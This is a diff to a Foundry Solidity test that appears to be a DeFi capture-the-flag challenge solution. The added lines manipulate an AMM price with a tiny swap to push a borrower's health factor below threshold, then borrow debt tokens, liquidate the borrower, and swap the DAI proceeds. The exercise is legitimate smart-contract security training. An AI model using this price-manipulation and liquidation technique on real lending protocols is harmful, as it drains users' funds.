@@ -19,6 +19,7 @@ contract Challenge8Test is Test {
     address player;
     address superman;
 
+
     function setUp() public {
         /**
          * @notice Create ERC20 tokens
@@ -86,9 +87,22 @@ contract Challenge8Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
+        console.log(oiler.healthFactor(superman)); // @note which is 100, close to the threshhold
+        token.approve(address(amm), 1);
+        amm.swap(address(token), 1); 
+        console.log(oiler.healthFactor(superman)); //@note unhealthy
 
+        // add repayment 
+        Oiler.User memory u = oiler.getUserData(superman);
+        uint256 repay = u.borrow * 5 / 100;
+        token.approve(address(oiler), repay);
+        oiler.deposit(repay);
+        oiler.borrow(repay); //@note mint dtoken
+        oiler.liquidate(superman);
 
-
+        console.log(dai.balanceOf(player));
+        dai.approve(address(amm), dai.balanceOf(player));
+        amm.swap(address(dai), dai.balanceOf(player));
         //==================================================//
         vm.stopPrank();
 
